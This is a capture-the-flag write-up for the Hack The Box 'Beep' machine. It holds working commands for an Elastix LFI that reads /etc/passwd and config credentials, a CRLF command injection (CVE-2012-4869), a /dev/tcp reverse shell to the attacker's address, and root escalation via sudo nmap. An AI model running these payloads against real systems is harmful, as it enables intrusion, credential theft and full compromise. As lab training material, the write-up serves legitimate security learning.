# Target
[Beep](https://app.hackthebox.com/machines/Beep) has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access. 

# Scan
```
nmap -sS -sC $TARGET_IP
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 22:10 CET
Nmap scan report for 10.129.229.183
Host is up (0.026s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http
|_http-title: Did not follow redirect to https://10.129.229.183/
110/tcp   open  pop3
111/tcp   open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            853/udp   status
|_  100024  1            856/tcp   status
143/tcp   open  imap
443/tcp   open  https
|_ssl-date: 2025-02-10T21:10:10+00:00; +4s from scanner time.
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-title: Elastix - Login page
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt

Host script results:
|_clock-skew: 3s

Nmap done: 1 IP address (1 host up) scanned in 312.07 seconds
```

# Foothold
There is a lot of remote services running on this target, but let's focus on HTTP(S). Our first probe shows that we need to use HTTPS.
```
curl -I http://$TARGET_IP
```
```
HTTP/1.1 302 Found
Date: Tue, 11 Feb 2025 12:15:32 GMT
Server: Apache/2.2.3 (CentOS)
Location: https://10.129.66.230/
Connection: close
Content-Type: text/html; charset=iso-8859-1
```

However TLS certificate has expired.
```
curl -I https://$TARGET_IP
```
```
curl: (60) server verification failed: certificate has expired. (CAfile: /etc/ssl/certs/ca-certificates.crt CRLfile: none)
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the webpage mentioned above.
```

So let's just skip it's verification.
```
curl -I https://$TARGET_IP --insecure
```
```
HTTP/1.1 200 OK
Date: Tue, 11 Feb 2025 12:28:31 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Set-Cookie: elastixSession=quc2pdgj7as98ioetgjkaihkh5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
```

To be able to skip verification in FireFox you would need to:
- Go to `about:config`
- Click `Accept the Risk and Continue`
- Search for `security.tls.version.min`
- Change it's value from `3` to `1`.

**Just remember to set it back to `3` after the challenge is solved!**

Finally, after landing on https://$TARGET_IP we can see Elastix administration panel login screen. Let's [check](https://www.google.com/search?q=Elastix+vulnerability) if there are some interesting vulnerabilities we could exploit. As expected there are plenty to chose from, let's chain those two:

- [CVE-N/A](https://www.exploit-db.com/exploits/37637) - pre-authenticated LFI in `graph.php`.
- [CVE-2012-4869](https://nvd.nist.gov/vuln/detail/CVE-2012-4869) - pre-authenticated RCE in `callme_page.php`.

First vulnerability gives us ability to read any file as Elastix server running user. Let's try to read `/etc/passwd`.
```
curl "https://$TARGET_IP/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action" --insecure
```
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```

Tareget is vulnerable! We could us it to read Asterisk configuration to exfiltrate some credentials.
```
curl -s "https://$TARGET_IP/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action" --insecure | grep -v '#' | grep -E 'USER|PASS'
```
```
AMPDBUSER=asteriskuser
AMPDBPASS=************
AMPMGRUSER=admin
AMPMGRPASS=************
FOPPASSWORD=************
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=************
```

We could use `AMPMGRUSER` and `AMPMGRPASS` to login to Elastix administration panel. We could also check if password has been reused for SSH access.

```
ssh -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa fanis@$TARGET_IP
fanis@10.129.66.230's password: 
Permission denied, please try again.
```

No luck with `fanis`, but before we will continue let's check just this password for `root`.
```
ssh -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa root@$TARGET_IP
root@10.129.66.230's password: 
Last login: Tue Feb 11 18:52:02 2025 from 10.10.14.212

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.66.230

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

Well... this is quite unexpected, but it shows that is always worth to spray password against all users, including `root`. As we immediately got `root` access we could finish here, but let's run extra mile and pretend that password is invalid ;) and in that situation we would try to exploit [CVE-2012-4869](https://nvd.nist.gov/vuln/detail/CVE-2012-4869). To do so, we would need to execute `callme_page.php` with specially crafted parameters. We will adapt [this Metasploit module](https://www.exploit-db.com/exploits/18659) to our needs as it does not seems to work on it's own (I would assume due to expired TLS certificate). `callme_page.php` script requires as one of it's parameters valid `callmenum` which is basically number in extension which is a rule in the dial plan that defines how calls are handled. Metasploit module that we are analyzing simply tries to brute force it, but we will use LFI to locate this extension number (we could also use web browser to find this in admin panel).

```
curl -s "https://$TARGET_IP/vtigercrm/graph.php?current_language=../../../../../../../../etc/asterisk/sip_additional.conf%00&module=Accounts&action" --insecure | grep -Eo '^\[[^]]+\]' | tr -d '[]' | head -n 1
```
```
233
```

With extension number (`233`) found let's put it togheter with our probing command (`id > /tmp/id`) into URL from Metasploit module and check content of `/tmp/id` with LFI.
```
ENCODED_CMD=$(echo "id > /tmp/id" | jq -sRr @uri)
EXTENSION=223
curl -s "https://$TARGET_IP/recordings/misc/callme_page.php?action=c&callmenum=$EXTENSION@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20$ENCODED_CMD%0D%0A%0D%0A" --insecure > /dev/null && \
curl -s "https://$TARGET_IP/vtigercrm/graph.php?current_language=../../../../../../../../tmp/id%00&module=Accounts&action" --insecure
```
```
uid=100(asterisk) gid=101(asterisk)
Sorry! Attempt to access restricted file. 
```

Remote command executed! Let's replace our probe with reverse shell command, but first we will start to listen for incoming connection with `nc`.
```
nc -lvnp 4444
```
```
listening on [any] 4444 ...
```

With everything in place let's run final version of our `curl` based exploit.
```
REVERSE_SHELL=$(echo "sh -i >& /dev/tcp/$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)/4444 0>&1" | jq -sRr @uri)
EXTENSION=$(curl -s "https://$TARGET_IP/vtigercrm/graph.php?current_language=../../../../../../../../etc/asterisk/sip_additional.conf%00&module=Accounts&action" --insecure | grep -Eo '^\[[^]]+\]' | tr -d '[]' | head -n 1)
curl -s "https://$TARGET_IP/recordings/misc/callme_page.php?action=c&callmenum=$EXTENSION@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20$REVERSE_SHELL%0D%0A%0D%0A" --insecure > /dev/null
```

And on `netcat` we have got reverse shell connection.
```
connect to [10.10.14.212] from (UNKNOWN) [10.129.66.230] 50209
sh: no job control in this shell
sh-3.2$ id
uid=100(asterisk) gid=101(asterisk)
```

We have gained a foothold, let's grab user flag and proceed to privilege escalation.
```
cat /home/fanis/user.txt
********************************
```

# Privileges escalation
Let's start with listing sudo privileges.
```
sudo -l
```
```
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

There are plenty of commands to choose from. Let's use `nmap` interactive mode to spawn root shell.
```
sudo nmap --interactive
```
```
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

Privileges escalated, let's grab root flag and we are done.
```
cat /root/root.txt
********************************
```